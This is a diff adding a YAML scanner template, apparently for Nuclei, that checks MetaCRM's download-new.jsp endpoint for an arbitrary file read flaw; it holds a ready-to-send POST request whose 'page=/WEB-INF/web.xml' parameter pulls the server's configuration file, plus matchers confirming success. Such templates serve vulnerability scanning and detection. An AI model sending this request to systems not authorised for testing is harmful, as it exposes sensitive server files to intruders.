@@ -1,0 +1,35 @@
+id: metasoft-crm-download-new-fileread
+info:
+  name: MetaCRM 客户关系管理系统 download-new.jsp 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM download-new.jsp 接口存在文件读取漏洞(有限的),攻击者可以利用该漏洞读取设备上任意文件内容，造成敏感信息泄露。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/sgpb6rvsr3p4yfxw
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: metasoft,fileread
+
+http:
+  - raw:
+      - |
+        POST /business/common/download-new.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 36
+
+        filename=1.png&page=/WEB-INF/web.xml
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','servlet')
+        condition: and
